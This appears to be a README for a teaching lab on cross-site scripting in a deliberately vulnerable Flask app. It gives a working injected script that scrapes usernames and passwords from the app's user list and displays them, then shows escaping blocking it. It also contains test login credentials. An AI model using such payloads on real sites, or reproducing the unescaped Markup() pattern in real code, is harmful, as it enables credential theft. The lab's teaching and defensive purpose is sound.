# Cross-Site Scripting (XSS)

## Testing
The following is a demonstration on how to set up the app and perform a XSS attack in secure and vulnerable mode.
- In vulnerable mode, the user is able inject a JavaScript code in the search field to retrieve data from the /list-users page.
The user query is wrapped in Markup() and treated as safe, this creates a vulnerability by allowing user inputs without escaping.
- In secure mode, special HTML characters are escaped preventing XSS attacks. Flask has automatic escaping enabled.

## Setting up and Running the Application

### Prerequisites
- Python 3
- Flask and required dependencies
- Application code running on `http://127.0.0.1:5000`

### Start the Flask app
```bash
python3 app.py
```

---

## Vulnerable Mode
1. Log in to the app at `/login` with:
   - Username: `tester`
   - Password: `abc123`
   - Mode: **Vulnerable**
2. Navigate to the 'Activity' page 
3. In the search field, copy and paste the following code:
``` 
"><script>
fetch('/list-users')
  .then(res => res.text())
  .then(html => {
    let div = document.createElement('div');
    div.innerHTML = html;
    let rows = div.querySelectorAll('tbody tr');
    let creds = [];
    rows.forEach(row => {
      let tds = row.querySelectorAll('td');
      let user = tds[2]?.innerText.trim();
      let pass = tds[3]?.innerText.trim();
      if (user && pass) creds.push(user + ': ' + pass);
    });
    alert(creds.join('\n'));
  });
</script>
```
4. Press enter to execute the code
5. Observe that a popup will appear at the top of the page with usernames and passwords from the /list-users page

---

## Secure Mode
1. Log in to the app at `/login` with:
   - Username: `tester`
   - Password: `abc123`
   - Mode: **Secure**
2. Navigate to the 'Activity' page 
3. In the search field, copy and paste the following code:
``` 
"><script>
fetch('/list-users')
  .then(res => res.text())
  .then(html => {
    let div = document.createElement('div');
    div.innerHTML = html;
    let rows = div.querySelectorAll('tbody tr');
    let creds = [];
    rows.forEach(row => {
      let tds = row.querySelectorAll('td');
      let user = tds[2]?.innerText.trim();
      let pass = tds[3]?.innerText.trim();
      if (user && pass) creds.push(user + ': ' + pass);
    });
    alert(creds.join('\n'));
  });
</script>
```
4. Press enter to execute the code
5. Observe that no popups appear with usernames and passwords

---

## Mitigations
Flask automatically has special characters escaped enabled so using Flask helps prevent against XSS attacks. Developers should be mindful when using Markup()
because that can create a vulnerability for XSS. 

## Resources

1. [OWASP Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
2. [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
3. [OWASP DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
4. [Markup Safe](https://pypi.org/project/MarkupSafe/)
5. [Flask Escaping](https://flask.palletsprojects.com/en/stable/quickstart/)
6. [JavaScript Fetching w3 Schools](https://www.w3schools.com/jsref/api_fetch.asp)
7. [JavaScript Fetching Tutorial](https://www.digitalocean.com/community/tutorials/how-to-use-the-javascript-fetch-api-to-get-data)

